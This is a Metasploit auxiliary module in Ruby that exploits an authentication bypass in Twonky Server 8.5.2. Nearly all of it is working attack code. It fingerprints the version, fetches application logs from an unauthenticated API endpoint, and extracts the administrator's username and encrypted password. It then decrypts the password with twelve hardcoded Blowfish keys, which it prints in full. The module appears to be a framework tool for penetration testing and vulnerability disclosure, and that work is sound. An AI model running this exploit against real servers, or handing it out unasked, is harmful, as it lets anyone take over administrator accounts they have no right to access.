##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Twonky Server Log Leak Authentication Bypass',
        'Description' => %q{
          This module leverages an authentication bypass in Twonky Server 8.5.2. By exploiting
          an authorization flaw to access a privileged web API endpoint and leak application logs,
          encrypted administrator credentials are leaked (CVE-2025-13315). The exploit will then decrypt
          these credentials using hardcoded keys (CVE-2025-13316) and login as the administrator.
          Expected module output is a username and plain text password for the administrator account.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'remmons-r7' # Initial discovery, MSF module
        ],
        'References' => [
          ['CVE', '2025-13315'],
          ['CVE', '2025-13316'],
          ['URL', 'https://www.rapid7.com/blog/post/cve-2025-13315-cve-2025-13316-critical-twonky-server-authentication-bypass-not-fixed/']
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          # No IoCs, in logs or individual files, are known
          # If a non-default reverse proxy is configured in front of Twonky Server, it may log web traffic
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        Opt::RPORT(9000),
        OptString.new('TARGETURI', [true, 'The URI path to Twonky Server', '/'])
      ]
    )
  end

  def run
    # Unauthenticated requests to the '/dev0/desc.xml' endpoint should return the version number
    print_status('Confirming the target is vulnerable')
    res = send_request_cgi(
      {
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, 'dev0', 'desc.xml')
      }
    )

    fail_with(Failure::Unknown, 'Connection failed - unable to get XML web response') unless res

    # Confirm that the response contains the expected 8.5.2 XML string
    if (res&.code != 200) || (!res.body.include? '<modelNumber>8.5.2</modelNumber>')
      fail_with(Failure::NotVulnerable, 'The target does not appear to be a Twonky Server instance running version 8.5.2')
    end

    print_good('The target is Twonky Server v8.5.2')

    print_status('Attempting to leak the administrator username and encrypted password')
    res = send_request_cgi(
      {
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, 'nmc', 'rpc', 'log_getfile')
      }
    )

    fail_with(Failure::Unknown, 'Connection failed - unable to get log API response') unless res

    # Grab the most recent (last) administrator username value from the logs
    pattern = /accessuser\s*=\s*(\S+)\n/
    result = res.body.scan(pattern).last

    # If the log has been cleared since startup or the server hasn't restarted since setup
    fail_with(Failure::NotFound, 'The target did not return a log file containing a username value') unless result

    username = result[0]

    print_good("The target returned the administrator username: #{username}")

    # Grab the most recent (last) password value from the logs to decrypt
    # "||" + hex number (key index) + hex Blowfish ECB ciphertext
    pattern = /\|\|([0-9A-F]){1}([a-fA-F0-9]{16}(?:[a-fA-F0-9]{4})*)\n/
    result = res.body.scan(pattern).last

    # If the log has been cleared since the last password change or the server hasn't restarted since setup
    fail_with(Failure::NotFound, 'The target did not return a log file containing a password value') unless result

    # Extract the encryption key index as base16
    enc_key_index = result[0]

    # Handle possible match array containing more than minimum 16 chars (longer encrypted password)
    if !result[2].nil?
      enc_pwd = result[1] + result[2..].join
    else
      enc_pwd = result[1]
    end

    print_good("The target returned the encrypted password and key index: #{enc_pwd}, #{enc_key_index}")

    # Decrypt the admin password using static key
    password = decrypt_password(enc_pwd, enc_key_index)

    print_good("Credentials decrypted: USER=#{username} PASS=#{password}")

    report_vuln(
      host: rhost,
      name: name,
      refs: references
    )

    store_loot('Twonky Server Credentials', 'text/plain', datastore['RHOST'], "Username: \"#{username}\" Password: \"#{password}\"")
  end

  # Decrypt the password using Blowfish ECB with the specified encryption key
  def decrypt_password(pwd, key_num)
    # Twonky Server 8.5.2 uses static encryption keys for passwords
    static_keys = [
      'E8ctd4jZwMbaV587',
      'TGFWfWuW3cw28trN',
      'pgqYY2g9atVpTzjY',
      'KX7q4gmQvWtA8878',
      'VJjh7ujyT8R5bR39',
      'ZMWkaLp9bKyV6tXv',
      'KMLvvq6my7uKkpxf',
      'jwEkNvuwYCjsDzf5',
      'FukE5DhdsbCjuKay',
      'SpKNj6qYQGjuGMdd',
      'qLyXuAHPTF2cPGWj',
      'rKz7NBhM3vYg85mg'
    ]

    # Encrypted password hex to bytes
    pwd_bytes = [pwd].pack('H*')

    # Select the appropriate key, based on the index hex number stored with the ciphertext
    key = static_keys[key_num.to_i(16)]

    print_status("Decrypting password using key: #{key}")

    cipher = OpenSSL::Cipher.new('bf-ecb').decrypt
    cipher.key_len = key.length
    cipher.padding = 0
    cipher.key = key
    cipher.update(pwd_bytes) + cipher.final
  end
end
